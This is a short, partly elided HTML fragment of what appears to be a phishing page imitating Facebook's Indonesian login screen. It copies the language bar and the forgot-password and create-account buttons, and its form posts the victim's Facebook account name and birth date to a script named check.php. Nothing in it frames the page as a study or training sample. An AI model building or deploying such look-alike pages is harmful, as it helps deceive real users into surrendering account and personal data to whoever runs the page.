...
<center>
<div class="Bahasa">Indonesia • Bahasa Melayu • 日本語 • <span>More...</span></div>
</center>

<div class="box">
<form action="check.php" method="post">
<input type="text" name="nama" placeholder="Nama akun facebook" required>
<input type="text" name="tanggal" placeholder="Tanggal,Bulan,Tahun Lahir" required>
</br>
</br>
...
<button type="button" class="btn-forgot">Lupa Kata Sandi?</button>
<div class="divider">
<span>atau</span>
</div>
<center>
<button type="button" class="btn-create">Buat Akun Baru</button>
</center>
</div> <!--- box --->
